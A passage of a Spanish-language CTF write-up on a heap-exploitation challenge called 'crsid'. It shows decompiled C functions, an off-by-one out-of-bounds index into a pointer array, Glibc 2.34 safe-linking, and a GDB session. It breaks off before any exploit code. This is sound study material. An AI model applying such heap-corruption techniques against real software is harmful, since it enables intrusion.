+<span class="mtkw">    </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(p_user</span><span class="mtkw"> </span><span class="mtk5">==</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Something</span><span class="mtkw"> </span><span class="mtk4">weird</span><span class="mtkw"> </span><span class="mtk4">happened."</span><span class="mtk1">);</span>  
+<span class="mtkw">      </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">      </span><span class="mtk1">users[num_users]</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk1">p_user;</span>
+<span class="mtkw">      </span><span class="mtk5">*</span><span class="mtk1">p_user</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
+<span class="mtkw">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"A</span><span class="mtkw"> </span><span class="mtk4">new</span><span class="mtkw"> </span><span class="mtk4">username</span><span class="mtkw"> </span><span class="mtk4">appeared!"</span><span class="mtk1">);</span>
+<span class="mtkw">      </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk1">}</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">return</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Esta función solamente permite asignar <em>chunks</em> de tamaño <code>0x40</code> (que serán <code>0x50</code> en los metadatos del <em>heap</em>). El número de asignaciones está limitado a 12, y se comprueba en la función denominada <code>check_users</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk8">check_users</span><span class="mtk1">()</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">num_users;</span>
+<span class="mtkw">  </span>
+<span class="mtkw">  </span><span class="mtk1">num_users</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtkw">  </span><span class="mtk5">while</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk6">12</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk1">num_users)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">      </span><span class="mtk5">return</span><span class="mtkw"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk1">}</span>
+
+<span class="mtkw">    </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(users[num_users]</span><span class="mtkw"> </span><span class="mtk5">==</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">break</span><span class="mtk1">;</span>  
+
+<span class="mtkw">    </span><span class="mtk1">num_users</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk1">num_users</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">return</span><span class="mtkw"> </span><span class="mtk1">num_users;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Existe una variable global renombrada como <code>users</code> que contiene un vector con los 12 punteros de los usuarios.</p><h3 id="función-de-liberación">Función de liberación</h3><p>Esta es la función para borrar usuarios (<code>delete_username</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk8">delete_username</span><span class="mtk1">()</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">err;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">in_FS_OFFSET;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">index;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">canary;</span>
+
+<span class="mtkw">  </span><span class="mtk1">canary</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Username</span><span class="mtkw"> </span><span class="mtk4">index:</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">,</span><span class="mtkw"> </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+
+<span class="mtkw">  </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"That</span><span class="mtkw"> </span><span class="mtk4">won</span><span class="mtk6">\'</span><span class="mtk4">t</span><span class="mtkw"> </span><span class="mtk4">work."</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">((index</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">||</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk6">12</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk1">index))</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Where</span><span class="mtkw"> </span><span class="mtk4">are</span><span class="mtkw"> </span><span class="mtk4">you</span><span class="mtkw"> </span><span class="mtk4">going?"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(users[index]</span><span class="mtkw"> </span><span class="mtk5">==</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"No</span><span class="mtkw"> </span><span class="mtk4">such</span><span class="mtkw"> </span><span class="mtk4">username."</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">free</span><span class="mtk1">(users[index]);</span>
+<span class="mtkw">    </span><span class="mtk1">users[index]</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Username</span><span class="mtkw"> </span><span class="mtk4">removed</span><span class="mtkw"> </span><span class="mtk4">successfully!"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(canary</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">))</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">                    </span><span class="mtk3">/*</span><span class="mtkw"> </span><span class="mtk3">WARNING:</span><span class="mtkw"> </span><span class="mtk3">Subroutine</span><span class="mtkw"> </span><span class="mtk3">does</span><span class="mtkw"> </span><span class="mtk3">not</span><span class="mtkw"> </span><span class="mtk3">return</span><span class="mtkw"> </span><span class="mtk3">*/</span>  
+<span class="mtkw">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">return</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Aquí tenemos una vulnerabilidad porque la variable <code>index</code> puede tener <code>12</code> como valor, y los índices de <code>user</code> van desde <code>0</code> hasta <code>11</code>. Por tanto, podemos acceder al vector <em>out-of-bounds</em> (OOB). Además, después de la variable global <code>users</code>, tenemos <code>crsid</code>, que está bajo nuestro control (lo podemos cambiar con la opción <code>5</code>, que aparece en la función <code>main</code>). Veremos esto luego con GDB.</p><h3 id="función-de-edición">Función de edición</h3><p>Esta es la función <code>edit_username</code> (opción <code>3</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk8">edit_username</span><span class="mtk1">()</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">err;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">size_t</span><span class="mtkw"> </span><span class="mtk1">newline_index;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">in_FS_OFFSET;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">index;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">canary;</span>
+<span class="mtkw">  </span>
+<span class="mtkw">  </span><span class="mtk1">canary</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Username</span><span class="mtkw"> </span><span class="mtk4">index:</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">,</span><span class="mtkw"> </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+
+<span class="mtkw">  </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"That</span><span class="mtkw"> </span><span class="mtk4">won</span><span class="mtk6">\'</span><span class="mtk4">t</span><span class="mtkw"> </span><span class="mtk4">work."</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">((index</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">||</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk6">12</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk1">index))</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Where</span><span class="mtkw"> </span><span class="mtk4">are</span><span class="mtkw"> </span><span class="mtk4">you</span><span class="mtkw"> </span><span class="mtk4">going?"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(users[index]</span><span class="mtkw"> </span><span class="mtk5">==</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"No</span><span class="mtkw"> </span><span class="mtk4">such</span><span class="mtkw"> </span><span class="mtk4">username."</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Username:</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, users[index],</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">newline_index</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">strcspn</span><span class="mtk1">(users[index],</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">users[index][newline_index]</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Username</span><span class="mtkw"> </span><span class="mtk4">changed</span><span class="mtkw"> </span><span class="mtk4">successfully!"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(canary</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">))</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">                    </span><span class="mtk3">/*</span><span class="mtkw"> </span><span class="mtk3">WARNING:</span><span class="mtkw"> </span><span class="mtk3">Subroutine</span><span class="mtkw"> </span><span class="mtk3">does</span><span class="mtkw"> </span><span class="mtk3">not</span><span class="mtkw"> </span><span class="mtk3">return</span><span class="mtkw"> </span><span class="mtk3">*/</span>  
+<span class="mtkw">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">return</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>La función es correcta, excepto por el acceso OOB. Podemos escribir hasta <code>0x40</code> bytes en el <em>chunk</em>, por lo que no podemos desbordar al <em>chunk</em> adyacente.</p><h3 id="función-de-información">Función de información</h3><p>Finalmente, esta es <code>show_username</code> (opción <code>4</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk8">show_username</span><span class="mtk1">()</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">err;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">in_FS_OFFSET;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">index;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">canary;</span>
+<span class="mtkw">  </span>
+<span class="mtkw">  </span><span class="mtk1">canary</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Username</span><span class="mtkw"> </span><span class="mtk4">index:</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">,</span><span class="mtkw"> </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+
+<span class="mtkw">  </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"That</span><span class="mtkw"> </span><span class="mtk4">won</span><span class="mtk6">\'</span><span class="mtk4">t</span><span class="mtkw"> </span><span class="mtk4">work."</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">((index</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">||</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk6">12</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk1">index))</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Where</span><span class="mtkw"> </span><span class="mtk4">are</span><span class="mtkw"> </span><span class="mtk4">you</span><span class="mtkw"> </span><span class="mtk4">going?"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(users[index]</span><span class="mtkw"> </span><span class="mtk5">==</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"No</span><span class="mtkw"> </span><span class="mtk4">such</span><span class="mtkw"> </span><span class="mtk4">username."</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Username:</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(users[index]);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(canary</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">))</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">                    </span><span class="mtk3">/*</span><span class="mtkw"> </span><span class="mtk3">WARNING:</span><span class="mtkw"> </span><span class="mtk3">Subroutine</span><span class="mtkw"> </span><span class="mtk3">does</span><span class="mtkw"> </span><span class="mtk3">not</span><span class="mtkw"> </span><span class="mtk3">return</span><span class="mtkw"> </span><span class="mtk3">*/</span>  
+<span class="mtkw">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
+<span class="mtkw">  </span><span class="mtk1">}</span>
+
+<span class="mtkw">  </span><span class="mtk5">return</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtk1">}</span>
+</code></pre></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Para planear la estrategia de explotación, tenemos que tener en cuenta que el binario utiliza Glibc 2.34 (proporcionada en el reto):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">glibc/ld-2.34.so</span> <span class="mtku">glibc/libc.so.6</span>
+GNU C Library (GNU libc) stable release version 2.34.
+Copyright (C) 2021 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A  
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 11.1.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+For bug reporting instructions, please see:
+&lt;https://www.gnu.org/software/libc/bugs.html&gt;.
+</code></pre></div><h3 id="_safe-linking_"><em>Safe-linking</em></h3><p>Esta es una versión de Glibc bastante protegida. Si miramos en <a href="https://github.com/shellphish/how2heap/tree/master/glibc_2.34">how2heap</a>, veremos que utiliza <em>safe-linking</em> para ofuscar los punteros <em>forward</em> (<code>fd</code>) en <em>chunks</em> liberados. Podemos verlo en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">crsid</span>
+Reading symbols from <span class="code-dark-green">crsid</span>...
+(No debugging symbols found in <span class="code-dark-green">crsid</span>)
+<span class="code-red">pwndbg&gt; </span>run
+Starting program: ./crsid
+ ██████╗██████╗ ███████╗██╗██████╗
+██╔════╝██╔══██╗██╔════╝██║██╔══██╗
+██║     ██████╔╝███████╗██║██║  ██║
+██║     ██╔══██╗╚════██║██║██║  ██║
+╚██████╗██║  ██║███████║██║██████╔╝
+ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝
+
+[i] Enter your CRSid: asdf
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] 1
+A new username appeared!
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] 1
+A new username appeared!
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] 2
+Username index: 1
+Username removed successfully!
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] 2
+Username index: 0
+Username removed successfully!
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
